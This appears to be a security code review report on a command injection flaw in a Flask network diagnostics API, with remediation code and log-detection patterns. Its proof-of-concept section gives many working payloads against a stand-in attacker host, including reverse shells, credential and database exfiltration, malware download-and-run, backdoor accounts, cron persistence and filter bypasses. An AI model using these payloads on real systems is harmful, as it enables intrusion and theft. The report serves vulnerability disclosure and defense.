# Security Code Review Report

## Target Information
- **Domain**: tools.example.com
- **Review Date**: 2024-11-05
- **Reviewer**: Security Team
- **Repository**: https://github.com/example/dev-tools
- **Commit Hash**: 4d2e7a9c3f6b1e8a5d9c2f7b4e8a6c3d9f5b2e7a

---

## Executive Summary

This report identifies a critical Remote Code Execution (RCE) vulnerability in the network diagnostics tool at tools.example.com. The vulnerability exists due to command injection in the ping and traceroute functionality, allowing attackers to execute arbitrary system commands on the server.

---

## Vulnerability Details

### 1. OS Command Injection in Network Tools

**Severity**: CRITICAL
**CWE**: CWE-78 (OS Command Injection)
**CVSS Score**: 10.0
**File**: `network/diagnostics.py:67`
**Git Commit**: 4d2e7a9c3f6b1e8a5d9c2f7b4e8a6c3d9f5b2e7a

#### Description
The network diagnostic tool accepts user input for ping and traceroute operations and directly passes it to shell commands without proper sanitization. This allows attackers to inject arbitrary commands that execute with the web application's privileges.

#### Vulnerable Code
```python
# network/diagnostics.py

from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

@app.route('/api/network/ping', methods=['POST'])
def ping_host():
    """
    Ping a host to check connectivity
    """
    data = request.get_json()
    host = data.get('host', '')

    if not host:
        return jsonify({'error': 'Host parameter required'}), 400

    try:
        # VULNERABLE: Direct shell command injection
        command = f"ping -c 4 {host}"
        result = subprocess.check_output(
            command,
            shell=True,  # DANGEROUS: Allows shell metacharacters
            stderr=subprocess.STDOUT,
            timeout=10
        )

        return jsonify({
            'success': True,
            'output': result.decode('utf-8')
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/network/traceroute', methods=['POST'])
def traceroute_host():
    """
    Perform traceroute to a host
    """
    data = request.get_json()
    host = data.get('host', '')
    max_hops = data.get('max_hops', 30)

    # VULNERABLE: String formatting with user input
    command = f"traceroute -m {max_hops} {host}"

    try:
        result = os.popen(command).read()  # VERY DANGEROUS
        return jsonify({'success': True, 'output': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

#### Proof of Concept

**1. Basic Command Injection:**
```bash
# Execute whoami command
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; whoami"}'

# Output will show: www-data (or web server user)
```

**2. Read Sensitive Files:**
```bash
# Read /etc/passwd
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; cat /etc/passwd"}'

# Read application config
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "localhost && cat /var/www/config/.env"}'
```

**3. Reverse Shell:**
```bash
# Bash reverse shell
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'

# Python reverse shell
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d "{\"host\": \"8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"attacker.com\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'\"}"

# Netcat reverse shell
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; nc attacker.com 4444 -e /bin/bash"}'
```

**4. Data Exfiltration:**
```bash
# Exfiltrate database credentials
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; curl -X POST https://attacker.com/exfil -d @/var/www/config/database.yml"}'

# Dump entire database
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; mysqldump -u root -pPASSWORD --all-databases | curl -X POST https://attacker.com/dump --data-binary @-"}'
```

**5. Download and Execute Malware:**
```bash
# Download and execute script
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; wget https://attacker.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh"}'

# One-liner payload
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; curl https://attacker.com/backdoor.sh | bash"}'
```

**6. Create Backdoor User:**
```bash
# Add new user with sudo privileges
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; useradd -m -s /bin/bash hacker && echo \"hacker:P@ssw0rd\" | chpasswd && usermod -aG sudo hacker"}'
```

**7. Cryptominer Installation:**
```bash
# Install cryptocurrency miner
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; wget https://attacker.com/xmrig && chmod +x xmrig && ./xmrig -o pool.minexmr.com:4444 -u WALLET &"}'
```

**8. Persistence Mechanism:**
```bash
# Add cron job for persistence
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; echo \"* * * * * curl https://attacker.com/beacon.sh | bash\" | crontab -"}'

# Add SSH key
curl -X POST https://tools.example.com/api/network/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "8.8.8.8; echo \"ssh-rsa AAAAB3NzaC1... attacker@evil\" >> ~/.ssh/authorized_keys"}'
```

**9. Bypass Attempts for Basic Filters:**
```bash
# Using different separators
{"host": "8.8.8.8| whoami"}
{"host": "8.8.8.8|| whoami"}
{"host": "8.8.8.8& whoami"}
{"host": "8.8.8.8&& whoami"}
{"host": "8.8.8.8`whoami`"}
{"host": "8.8.8.8$(whoami)"}
{"host": "8.8.8.8%0Awhoami"}  # Newline injection

# URL encoding
{"host": "8.8.8.8%3Bwhoami"}  # ; encoded

# Using wildcards
{"host": "8.8.8.8; /bin/c?t /etc/passwd"}
{"host": "8.8.8.8; /???/cat /etc/passwd"}
```

**10. Advanced Exploitation Script:**
```python
#!/usr/bin/env python3
import requests
import base64

target = "https://tools.example.com/api/network/ping"

# Payload to establish reverse shell
attacker_ip = "attacker.com"
attacker_port = "4444"

# Base64 encoded reverse shell to avoid detection
reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
encoded_shell = base64.b64encode(reverse_shell.encode()).decode()

payload = {
    "host": f"8.8.8.8; echo {encoded_shell} | base64 -d | bash"
}

try:
    response = requests.post(target, json=payload, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")
except Exception as e:
    print(f"Error: {e}")
```

#### Impact
- **Complete Server Compromise**: Full system access
- **Data Exfiltration**: Access to all data and credentials
- **Lateral Movement**: Pivot to internal network
- **Malware Distribution**: Deploy ransomware, cryptominers
- **Service Disruption**: DoS attacks, system corruption
- **Privilege Escalation**: Potential root access via kernel exploits
- **Persistence**: Backdoors for long-term access

#### Remediation

**Secure Implementation:**

```python
# network/diagnostics.py - SECURE VERSION

from flask import Flask, request, jsonify
import subprocess
import re
import ipaddress

app = Flask(__name__)

def validate_hostname(host):
    """
    Validate hostname/IP address format
    """
    # 1. Check for IP address
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass

    # 2. Check for valid hostname format (RFC 1123)
    # Only allow alphanumeric, hyphens, and dots
    hostname_pattern = r'^(?=.{1,253}$)(?!-)(?:[a-zA-Z0-9-]{1,63}(?<!-)\.)*[a-zA-Z0-9-]{1,63}(?<!-)$'

    if re.match(hostname_pattern, host):
        # Additional check: no shell metacharacters
        dangerous_chars = [';', '&', '|', '$', '`', '\\n', '\\r', '(', ')', '<', '>', '!', '{', '}', '[', ']', '*', '?', '~']
        if not any(char in host for char in dangerous_chars):
            return True

    return False

@app.route('/api/network/ping', methods=['POST'])
def ping_host():
    """
    Securely ping a host to check connectivity
    """
    data = request.get_json()
    host = data.get('host', '').strip()

    if not host:
        return jsonify({'error': 'Host parameter required'}), 400

    # Validate input
    if not validate_hostname(host):
        return jsonify({'error': 'Invalid hostname or IP address'}), 400

    try:
        # SECURE: Use list argument form (no shell interpretation)
        result = subprocess.run(
            ['ping', '-c', '4', '-W', '2', host],  # List form - SAFE
            capture_output=True,
            text=True,
            timeout=10,
            shell=False,  # IMPORTANT: Never use shell=True
            check=False
        )

        return jsonify({
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr if result.returncode != 0 else None
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'}), 408
    except Exception as e:
        # Don't expose internal error details
        return jsonify({'error': 'An error occurred'}), 500


@app.route('/api/network/traceroute', methods=['POST'])
def traceroute_host():
    """
    Securely perform traceroute to a host
    """
    data = request.get_json()
    host = data.get('host', '').strip()
    max_hops = data.get('max_hops', 30)

    # Validate host
    if not validate_hostname(host):
        return jsonify({'error': 'Invalid hostname or IP address'}), 400

    # Validate max_hops is integer and within range
    try:
        max_hops = int(max_hops)
        if max_hops < 1 or max_hops > 64:
            return jsonify({'error': 'Max hops must be between 1 and 64'}), 400
    except (ValueError, TypeError):
        return jsonify({'error': 'Invalid max_hops value'}), 400

    try:
        # SECURE: Use list argument form
        result = subprocess.run(
            ['traceroute', '-m', str(max_hops), '-w', '2', host],
            capture_output=True,
            text=True,
            timeout=60,
            shell=False  # NEVER use shell=True
        )

        return jsonify({
            'success': True,
            'output': result.stdout
        })

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Command timed out'}), 408
    except Exception as e:
        return jsonify({'error': 'An error occurred'}), 500

# Additional security: Rate limiting
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["100 per hour"]
)

@app.route('/api/network/ping', methods=['POST'])
@limiter.limit("10 per minute")
def ping_host():
    # ... implementation above
    pass
```

**Alternative Secure Approach - Use Python Libraries:**

```python
# Use Python libraries instead of system commands

import ping3
import socket

@app.route('/api/network/ping', methods=['POST'])
def ping_host():
    data = request.get_json()
    host = data.get('host', '').strip()

    if not validate_hostname(host):
        return jsonify({'error': 'Invalid hostname'}), 400

    try:
        # Use ping3 library (no shell execution)
        delay = ping3.ping(host, timeout=2)

        if delay is None:
            return jsonify({
                'success': False,
                'message': f'Host {host} is unreachable'
            })

        return jsonify({
            'success': True,
            'message': f'Host {host} is reachable',
            'delay_ms': round(delay * 1000, 2)
        })

    except Exception as e:
        return jsonify({'error': 'An error occurred'}), 500
```

---

## Additional Findings

### 2. No Authentication Required

**Severity**: HIGH

The network tools endpoints are publicly accessible without authentication.

**Remediation**: Implement authentication middleware:
```python
from functools import wraps
from flask import request, jsonify

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token or not validate_token(token):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/network/ping', methods=['POST'])
@require_auth
def ping_host():
    # ... implementation
```

### 3. No Rate Limiting

**Severity**: MEDIUM

Lack of rate limiting enables abuse and DoS attacks.

**Remediation**: Implement rate limiting (shown in secure code above).

---

## Recommendations

1. **Immediate Actions** (within 2 hours):
   - Take network tools offline immediately
   - Check for unauthorized access in logs
   - Scan for backdoors and malware
   - Check for unauthorized user accounts
   - Review cron jobs and startup scripts
   - Reset all credentials and API keys

2. **Short-term Actions** (within 48 hours):
   - Implement secure subprocess handling
   - Add input validation and whitelist
   - Implement authentication and authorization
   - Add rate limiting
   - Deploy WAF rules
   - Enable security monitoring

3. **Long-term Improvements**:
   - Use Python libraries instead of system commands
   - Implement comprehensive logging
   - Regular security audits
   - Automated security testing
   - Security awareness training
   - Principle of least privilege

---

## Detection Methods

**Check for command injection in logs:**
```bash
# Look for shell metacharacters in requests
grep -E "[\;\|\&\$\`]" /var/log/app/access.log

# Look for common commands
grep -E "(whoami|wget|curl|bash|nc|netcat|python|perl)" /var/log/app/access.log

# Check for reverse shell attempts
grep -E "(\/dev\/tcp|bash -i|sh -i|0>&1)" /var/log/app/access.log

# Check system for suspicious processes
ps aux | grep -E "(nc|netcat|\/tmp|wget|curl)" | grep -v grep

# Check for unauthorized users
cat /etc/passwd | tail -n 5

# Check crontabs for malicious entries
crontab -l
ls -la /var/spool/cron/crontabs/
```

---

## Timeline
- **Discovery**: 2024-11-03
- **Verification**: 2024-11-04
- **Report Delivered**: 2024-11-05
- **Expected Fix**: IMMEDIATE (Critical Priority - within 4 hours)

---

## References
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- Python subprocess Security: https://docs.python.org/3/library/subprocess.html#security-considerations
- OWASP Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
